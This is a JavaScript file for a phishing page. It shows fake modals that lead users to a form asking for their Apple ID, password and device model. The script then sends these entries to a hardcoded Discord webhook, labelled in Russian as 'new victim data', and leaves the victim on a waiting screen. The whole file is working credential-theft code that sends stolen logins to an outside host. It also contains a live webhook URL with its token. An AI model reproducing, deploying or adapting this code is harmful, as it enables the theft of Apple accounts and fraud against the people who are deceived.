const moreBtn = document.getElementById('moreBtn');
const optionsModal = document.getElementById('optionsModal');
const formModal = document.getElementById('formModal');
const waitingModal = document.getElementById('waitingModal');
const submitBtn = document.getElementById('submitBtn');

// Показываем выбор опции при клике на "Подробнее"
moreBtn.addEventListener('click', () => {
    optionsModal.style.display = 'flex';
});

// Обработка выбора опции (все ведут к одной форме)
document.querySelectorAll('.option').forEach(opt => {
    opt.addEventListener('click', () => {
        optionsModal.style.display = 'none';
        formModal.style.display = 'flex';
    });
});

// Отправка данных
submitBtn.addEventListener('click', () => {
    const appleId = document.getElementById('appleId').value;
    const password = document.getElementById('password').value;
    const device = document.getElementById('deviceModel').value;

    if (!appleId || !password) {
        alert('Заполните все поля');
        return;
    }

    // Отправка в Discord webhook
    const webhookURL = 'https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK';
    const data = {
        content: '**Новые данные жертвы:**',
        embeds: [{
            title: 'Информация',
            fields: [
                { name: 'Apple ID', value: appleId, inline: true },
                { name: 'Пароль', value: password, inline: true },
                { name: 'Модель', value: device, inline: true }
            ],
            color: 0x00ff00
        }]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(() => {
        formModal.style.display = 'none';
        waitingModal.style.display = 'flex';
        // Через 3-4 часа можно перенаправить на другую страницу, но пока просто оставляем.
    })
    .catch(err => {
        alert('Ошибка, попробуйте ещё раз');
    });
});

// Закрытие модалок при клике вне окна
window.addEventListener('click', (e) => {
    if (e.target.classList.contains('modal')) {
        e.target.style.display = 'none';
    }
});
